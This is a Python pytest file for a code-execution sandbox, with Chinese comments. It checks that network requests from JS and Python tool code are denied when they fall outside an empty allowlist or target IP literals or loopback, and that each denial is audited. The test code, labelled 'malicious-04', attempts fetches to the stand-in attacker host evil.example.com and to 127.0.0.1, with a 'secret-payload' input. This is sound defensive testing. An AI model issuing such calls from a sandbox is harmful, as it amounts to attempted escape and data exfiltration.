#!/usr/bin/env python
# -*- coding: UTF-8 -*-
"""
M1 验收 4/7：网络越权（allowlist 外域名 / IP 直连 / 回环地址）。

核心断言：越权请求被拒 + 拒绝原因正确 + 全量留审计事件（NetEvent）。
（样例刻意全部走"被拒"路径——不打真实外网。）
"""

import pytest

from src.sandbox.contracts import SandboxLang
from test.conftest import wasm_available


@pytest.mark.skipif(not wasm_available("net_attempt"), reason="wasm 编译链不可用")
def test_js_net_attempts_all_denied_with_audit(sandbox, wasm_b64):
    r = sandbox.execute(
        lang=SandboxLang.JS,
        code=wasm_b64("net_attempt"),
        input="secret-payload",
        allowlist=[],  # 空 allowlist = 默认全拒
        meta={"agent_id": "malicious-04"},
    )
    assert r.ok  # 工具代码本身执行完成（收到拒绝 JSON 而非崩溃）
    assert r.result and "denied" in r.result

    # 越权域名拒绝
    assert "not_in_allowlist" in r.result or "empty_allowlist" in r.result
    # IP 直连拒绝
    assert "ip_literal_denied" in r.result

    # 全量审计：两次尝试各留一条 NetEvent，allowed=False
    denied = [ev for ev in r.net_events if not ev.allowed]
    assert len(denied) == 2
    assert any("evil.example.com" in ev.url for ev in denied)
    assert any("127.0.0.1" in ev.url for ev in denied)

def test_python_fetch_disabled_and_folio_fetch_denied(sandbox):
    r = sandbox.execute(
        lang=SandboxLang.PYTHON,
        code="""
import json
out = {}

# 1. 直接 fetch（浏览器式）必须被禁
try:
    from js import fetch
    fetch("https://evil.example.com/")
    out["direct_fetch"] = "AVAILABLE"
except Exception as e:
    out["direct_fetch"] = "BLOCKED"

# 2. folio_fetch 走 allowlist（空=全拒）
from js import folio_fetch
r1 = await folio_fetch("https://evil.example.com/x", None, None)
out["folio_fetch"] = r1.to_py().get("error", "ALLOWED")

result = json.dumps(out)
""",
        allowlist=[],
        meta={"agent_id": "malicious-04"},
    )
    assert r.ok, r.stderr[:300]
    assert '"BLOCKED"' in r.result
    assert "denied" in r.result  # folio_fetch 被拒
    assert len([e for e in r.net_events if not e.allowed]) >= 1
